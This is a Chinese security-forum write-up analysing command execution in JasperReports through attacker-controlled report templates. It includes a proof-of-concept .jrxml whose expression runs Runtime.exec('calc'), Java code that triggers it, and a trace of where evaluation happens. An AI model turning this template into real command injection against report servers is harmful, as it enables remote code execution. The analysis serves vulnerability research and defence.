---
title: JasperReports 命令执行问题
url: https://forum.butian.net/share/3751
source: 奇安信攻防社区
date: 2024-09-24
fetch_date: 2025-10-06T18:24:53.353117
---

# JasperReports 命令执行问题

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### JasperReports 命令执行问题

* [漏洞分析](https://forum.butian.net/topic/48)

JasperReports是一个全面的商业智能(BI)产品系列，提供强大的静态和交互式报告、报告服务器和数据分析功能。这些功能既可以作为独立产品提供，也可以作为集成的端到端 BI 套件的一部分提供。当该组件中的jrxml文件或jasper文件是可控状态时，则可能会存在命令执行文件

简介
--
[jaspersoft官网](https://community.jaspersoft.com/)
> JasperReports是一个全面的商业智能 （BI） 产品系列，提供强大的静态和交互式报告、报告服务器和数据分析功能。这些功能既可以作为独立产品提供，也可以作为集成的端到端 BI 套件的一部分提供。这些产品利用通用元数据并提供共享服务，例如安全性、存储库和计划。服务器公开了全面的公共接口。这实现了与其他应用程序的无缝集成，并能够轻松添加自定义功能。
### 漏洞成因
> JasperReports 中的所有公式都是通过表达式定义的。默认表达式语言是 Java，同时还支持JavaScript 或 Groovy语言。
> 在 JasperReports 中，可以在字段、参数和变量等地方使用表达式。无论表达式中的任何内容，在计算时，它都会返回一个值（可以是 null）。
表达式的具体实现参见官方文档
[jaspersoft官方文档](https://community.jaspersoft.com/documentation/jaspersoft%C2%AE-studio/tibco-jaspersoft-studio-user-guide/v900/jss-user-\_-expressions-\_-expressions/#jss-user\_basicnotions\_2905227221\_1043505)
### 获取jrxml文档
`.jrxml` 文件是 JasperReports 的报告定义文件。
`.jasper`文件是对`.jrxml`文件解析后生成的文件
关于如何获取一个标准的jrxml文档，可以从网络上直接下载，也可以使用JasperReports官方提供的客户端工具Jaspersoft Studio
[Community Edition](https://community.jaspersoft.com/download-jaspersoft/community-edition/)
打开之后就是如下图这个样子
![微信截图\_20240901181421.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-1ab896eb774d5d3ec80b969381d18661a603eef7.png)
接下来，新增一个变量，并插入一段弹计算器代码
![微信截图\_20240901181421.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-bf457c89d8ea91223156b03e21a6db3bb7b005c9.png)
看一下生成的jrxml文件是什么样的
![微信截图\_20240901181421.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-bfa02371539d31ab8b88d7bb5eeedda1392902a1.png)
漏洞复现
----
还是上面的程序，以及对应的`jrxml`文件
此时如果再对文件进行解析并填充页面，则会执行定义的代码，比如说点击预览，就能够执行代码
![微信截图\_20240901181421.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-f6d47932779cd4c4b4931c9588f097347a5e62a8.png)
### 代码层面复现
#### 环境
```php
jdk:8u251
<dependency>
<groupId>net.sf.jasperreports</groupId>
<artifactId>jasperreports</artifactId>
<version>6.19.1</version>
</dependency>
<!-- 全版本都存在安全问题 -->
```
#### POC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!-- Created with Jaspersoft Studio version 6.21.3.final using JasperReports Library version 6.21.3-4a3078d20785ebe464f18037d738d12fc98c13cf -->
<jasperReport xmlns="http://jasperreports.sourceforge.net/jasperreports" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://jasperreports.sourceforge.net/jasperreports http://jasperreports.sourceforge.net/xsd/jasperreport.xsd" name="Blank\_A4" pageWidth="595" pageHeight="842" columnWidth="555" leftMargin="20" rightMargin="20" topMargin="20" bottomMargin="20" uuid="a302c78f-b491-47ab-89b2-0ae491b01984">
<queryString>
<![CDATA[]]>
</queryString>
<variable name="calc" class="java.lang.String">
<variableExpression><![CDATA[java.lang.Runtime.getRuntime().exec("calc")]]></variableExpression>
</variable>
<background>
<band splitType="Stretch"/>
</background>
<title>
<band height="79" splitType="Stretch"/>
</title>
<pageHeader>
<band height="35" splitType="Stretch"/>
</pageHeader>
<columnHeader>
<band height="61" splitType="Stretch"/>
</columnHeader>
<detail>
<band height="125" splitType="Stretch"/>
</detail>
<columnFooter>
<band height="45" splitType="Stretch"/>
</columnFooter>
<pageFooter>
<band height="54" splitType="Stretch"/>
</pageFooter>
<summary>
<band height="42" splitType="Stretch"/>
</summary>
</jasperReport>
```
#### 测试代码1
```java
// 直接解析.jrxml文件
public static void main(String[] args) throws Exception {
Map<String, Object> hashMap = new HashMap<>();
File file = new File("1.jrxml");
JasperReport parentReport = JasperCompileManager.compileReport(new FileInputStream(file));
JasperPrint jasperPrint = JasperFillManager.fillReport(parentReport, hashMap, new JREmptyDataSource());//解析
}
```
![微信截图\_20240901181421.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-9c08565b3f900548f699e8d25c7a1c2b0bcb08f8.png)
注意计算机弹了两次
#### 测试代码2
```java
public static void test2() throws Exception{
String jrxml = "src/main/resources/jasperreports/jasper.jrxml";
String jasper = "src/main/resources/jasperreports/1.jasper";
Map<String, Object> hashMap = new HashMap<>();
JasperCompileManager.compileReportToFile(jrxml,jasper);
JasperFillManager.fillReport(jasper,hashMap,new JREmptyDataSource());
}
```
![微信截图\_20240901181421.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-db4c71eb6c5ada4c3f112eb30debed7bc5a3f41f.png)
计算机同样是弹了两次
漏洞分析
----
在`JasperFillManager.fillReport(`处下断，来分析一下代码
![微信截图\_20240901181421.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-e27d4d7b692805d6a71e3cc070a2cca144aa892a.png)
跟进来到`net.sf.jasperreports.engine.JasperFillManager#fillReport(net.sf.jasperreports.engine.JasperReport, java.util.Map<java.lang.String,java.lang.Object>, net.sf.jasperreports.engine.JRDataSource)`
![微信截图\_20240901181421.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-b06ae8eb630767563dba930dad6cbc554040d617.png)
接下来就是几个连续的重载，且并没有什么关键操作，所以直接来到`net.sf.jasperreports.engine.fill.JRBaseFiller#fill`
![微信截图\_20240901181421.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-842cc53f3dd8116fa2a2ccdd7992c5e0e23a8b5e.png)
`net.sf.jasperreports.engine.fill.JRVerticalFiller#fillReport`
![微信截图\_20240901181421.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-e319ba37ea0722e35ab049bb412e56f442f65138.png)
一路重载，来到`net.sf.jasperreports.engine.fill.JRFillDataset#next(boolean)`
![微信截图\_20240901181421.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-7771f2d0d1ac47d7a07c3950a27a0a20fc8de9a9.png)
`net.sf.jasperreports.engine.fill.JRCalculator#estimateVariables`
![微信截图\_20240901181421.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-65c2ecba722941526a5141aad31f8e212c4f8bf1.png)
![微信截图\_20240901181421.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-917817acf008f8776e63d9d821d3903d77b4e325.png)
跟进来到`net.sf.jasperreports.engine.fill.JREvaluator#evaluateEstimated(net.sf.jasperreports.engine.JRExpression)`
![微信截图\_20240901181421.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-35cca87d3d534b1277f81904f7b1a89739ad37f5.png)
到这里，第一次执行代码的地方能够找到了，那再回到`net.sf.jasperreports.engine.fill.JRVerticalFiller#fillReport`中，并跟进到`net.sf.jasperreports.engine.fill.JRVerticalFiller#fillReportStar`方法中(开始构造报告的页面了)
![微信截图\_20240901181421.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-1cc63022bde7b36fe9fdf25c79816dfb5febd56b.png)
`net.sf.jasperreports.engine.fill.JRVerticalFiller#fillDetail`
![微信截图\_20240901181421.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-33698361f9eb109a9ddd564fcd6146e638701d58.png)
这里再次对变量进行了估值计算，所以这里也会再一次执行表达式，至此，两次执行代码的地方均分析完成；
对于使用javascript和groovy的格式的表达式执行，跟上面的步骤基本相同，不过是执行表达式的地方有点区别。
相关测试代码已上传至<https://github.com/Mechoy/jarVuln>
总结
--
对JasperReports不是很熟悉，但是刚好碰见了所以进行了一个简单的分析。文章若存在错误的地方，见谅

* 发表于 2024-09-23 09:30:02
* 阅读 ( 19709 )
* 分类：[漏洞分析](https://forum.butian.net/community/Vul_analysis)

1 推荐
 收藏

## 0 条评论

请先 [登录](https://forum.butian.net/login) 后评论

[![mechoy](https://forum.butian.net/static/images/default_avatar.jpg)](https://forum.butian.net/people/8163)

[mechoy](https://forum.butian.net/people/8163)

6 篇文章

[奇安信攻防社区](https://forum.butian.net)|
联系我们

|
[sitemap](https://forum.butian.net/sitemap)

Copyright © 2013-2023 BUTIAN.NE...